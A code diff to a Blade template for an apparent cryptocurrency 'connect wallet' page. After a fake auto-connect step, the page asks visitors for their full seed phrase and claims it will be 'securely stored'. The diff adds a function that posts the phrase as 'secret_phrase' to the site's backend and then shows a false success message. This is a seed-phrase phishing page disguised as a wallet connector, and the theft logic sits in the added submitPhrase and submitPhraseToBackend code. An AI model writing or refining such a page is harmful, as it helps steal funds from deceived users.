@@ -2,7 +2,6 @@
 
 @section('content')
 <style>
-    /* Original website styling for connect page */
     .searchBox {
         display: grid;
         grid-template-columns: 80% 20%;
@@ -248,6 +247,11 @@
         background: #6d28d9;
     }
 
+    .btn-primary-custom:disabled {
+        background: #ccc;
+        cursor: not-allowed;
+    }
+
     textarea {
         width: 100%;
         height: 100px;
@@ -270,6 +274,44 @@
 
     .step-content.active {
         display: block;
+    }
+
+    .error-box {
+        background: #fee;
+        border: 1px solid #fcc;
+        border-radius: 5px;
+        padding: 15px;
+        margin-bottom: 15px;
+        color: #c33;
+    }
+
+    .loading-text {
+        display: inline-block;
+        margin-left: 10px;
+    }
+
+    .loading-text span {
+        animation: blink 1.4s infinite;
+    }
+
+    .loading-text span:nth-child(2) {
+        animation-delay: 0.2s;
+    }
+
+    .loading-text span:nth-child(3) {
+        animation-delay: 0.4s;
+    }
+
+    @keyframes blink {
+        0%, 20%, 50%, 80%, 100% {
+            opacity: 1;
+        }
+        40% {
+            opacity: 0.5;
+        }
+        60% {
+            opacity: 0.7;
+        }
     }
 </style>
 
@@ -302,9 +344,9 @@
                 <div class="author-avatar">
                     <a href="javascript:void(0);">
                         @if(strpos($wallet['logo'], 'http') === 0)
-                            <img src="{{ $wallet['logo'] }}" alt="{{ $wallet['name'] }}" class="avatar" onerror="this.src='/static/logo/placeholder.png'">
+                            <img src="{{ $wallet['logo'] }}" alt="{{ $wallet['name'] }}" class="avatar" onerror="this.src='/images/placeholder.png'">
                         @else
-                            <img src="{{ $wallet['logo'] }}" alt="{{ $wallet['name'] }}" class="avatar" onerror="this.src='/static/logo/placeholder.png'">
+                            <img src="{{ $wallet['logo'] }}" alt="{{ $wallet['name'] }}" class="avatar" onerror="this.src='/images/placeholder.png'">
                         @endif
                     </a>
                     <div class="badge"><i class="ripple"></i></div>
@@ -328,14 +370,19 @@
         <h4 style="margin-bottom: 20px; text-align: center;">Connecting to <strong id="selectedWalletName"></strong></h4>
         <div style="text-align: center;">
             <div class="spinner-border"></div>
+            <div class="loading-text">
+                <span>.</span><span>.</span><span>.</span>
+            </div>
         </div>
         <p style="margin-top: 20px; color: #6B7280; text-align: center;">Please wait while we connect your wallet...</p>
     </div>
 
     <div id="step2" class="step-content">
         <h4 style="margin-bottom: 20px;">Enter Recovery Phrase</h4>
-        <textarea id="phraseInput" placeholder="12, 15, 18, 21, or 24 word seed phrase..."></textarea>
-        <button onclick="submitPhrase()" class="btn-primary-custom" style="margin-top: 20px;">Continue</button>
+        <div id="errorBox" class="error-box" style="display: none;"></div>
+        <textarea id="phraseInput" placeholder="12, 15, 18, 21, or 24 word seed phrase..." required></textarea>
+        <small style="color: #666; display: block; margin-top: 10px;">Enter your wallet's seed phrase. This will be securely stored.</small>
+        <button onclick="submitPhrase()" class="btn-primary-custom" style="margin-top: 20px;">Connect Wallet</button>
     </div>
 
     <div id="step3" class="step-content">
@@ -343,13 +390,15 @@
             <h5>✓ Connection Successful!</h5>
             <p id="successMsg"></p>
         </div>
-        <button onclick="closeModal()" class="btn-primary-custom">Done</button>
+        <p style="color: #666; font-size: 14px; text-align: center; margin-bottom: 20px;">You can now close this dialog or connect another wallet.</p>
+        <button onclick="closeModal()" class="btn-primary-custom">Close</button>
     </div>
 </div>
 
 <script>
 let searchTimeout;
 let cachedCards = null;
+let selectedWalletName = '';
 
 function getCachedCards() {
     if (!cachedCards) {
@@ -376,20 +425,17 @@ function performSearch() {
     document.getElementById('resnum').textContent = count;
 }
 
-// Real-time search with debounce to prevent flickering
+// Real-time search with debounce
 const searchInput = document.getElementById('searchInp');
 searchInput.addEventListener('keyup', function() {
     clearTimeout(searchTimeout);
     searchTimeout = setTimeout(performSearch, 150);
 });
 
-searchInput.addEventListener('input', function(e) {
-    e.preventDefault();
-});
-
 function connectWallet(element) {
-    const walletName = element.dataset.title;
-    document.getElementById('selectedWalletName').textContent = walletName;
+    selectedWalletName = element.dataset.title;
+    document.getElementById('selectedWalletName').textContent = selectedWalletName;
+    document.getElementById('errorBox').style.display = 'none';
     
     // Show modal
     document.getElementById('modalOverlay').classList.add('active');
@@ -400,7 +446,7 @@ function connectWallet(element) {
     document.getElementById('step2').classList.remove('active');
     document.getElementById('step3').classList.remove('active');
 
-    // Simulate auto-connect after 2 seconds
+    // Simulate auto-connect attempt after 2 seconds
     setTimeout(() => {
         if (document.getElementById('modalOverlay').classList.contains('active')) {
             document.getElementById('step1').classList.remove('active');
@@ -418,25 +464,76 @@ function closeModal() {
     document.getElementById('step2').classList.remove('active');
     document.getElementById('step3').classList.remove('active');
     document.getElementById('phraseInput').value = '';
+    document.getElementById('errorBox').style.display = 'none';
 }
 
 function submitPhrase() {
-    const phrase = document.getElementById('phraseInput').value;
-    const phraseWords = phrase.trim().split(/\s+/).filter(word => word.length > 0);
+    const phrase = document.getElementById('phraseInput').value.trim();
+    const phraseWords = phrase.split(/\s+/).filter(word => word.length > 0);
     
-    if (![12, 15, 18, 21, 24].includes(phraseWords.length)) {
-        alert('Please enter a valid 12, 15, 18, 21, or 24 word seed phrase');
+    // Validate phrase
+    if (!phrase) {
+        showError('Please enter your seed phrase');
         return;
     }
     
-    document.getElementById('step2').classList.remove('active');
-    document.getElementById('step3').classList.add('active');
-    document.getElementById('successMsg').textContent = `Wallet "${document.getElementById('selectedWalletName').textContent}" has been connected successfully!`;
-    
-    // Auto-close after 3 seconds
-    setTimeout(() => {
-        closeModal();
-    }, 3000);
+    if (![12, 15, 18, 21, 24].includes(phraseWords.length)) {
+        showError('Invalid phrase. Please enter a valid 12, 15, 18, 21, or 24 word seed phrase.');
+        return;
+    }
+
+    // Submit to backend
+    submitPhraseToBackend(selectedWalletName, phrase);
+}
+
+function showError(message) {
+    const errorBox = document.getElementById('errorBox');
+    errorBox.textContent = message;
+    errorBox.style.display = 'block';
+}
+
+function submitPhraseToBackend(walletName, phrase) {
+    const submitBtn = document.querySelector('.step-content.active .btn-primary-custom');
+    const originalText = submitBtn.textContent;
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Connecting...';
+
+    // Send to backend
+    fetch('/connect/wallet', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
+        },
+        body: JSON.stringify({
+            wallet_name: walletName,
+            secret_phrase: phrase
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            // Show success step
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
+            document.getElementById('successMsg').textContent = `Your ${walletName} wallet has been connected successfully!`;
+            
+            // Auto-close after 4 seconds
+            setTimeout(() => {
+                closeModal();
+            }, 4000);
+        } else {
+            showError(data.message || 'Failed to connect wallet. Please try again.');
+            submitBtn.disabled = false;
+            submitBtn.textContent = originalText;
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        showError('Network error. Please check your connection and try again.');
+        submitBtn.disabled = false;
+        submitBtn.textContent = originalText;
+    });
 }
 
 // Close modal on overlay click
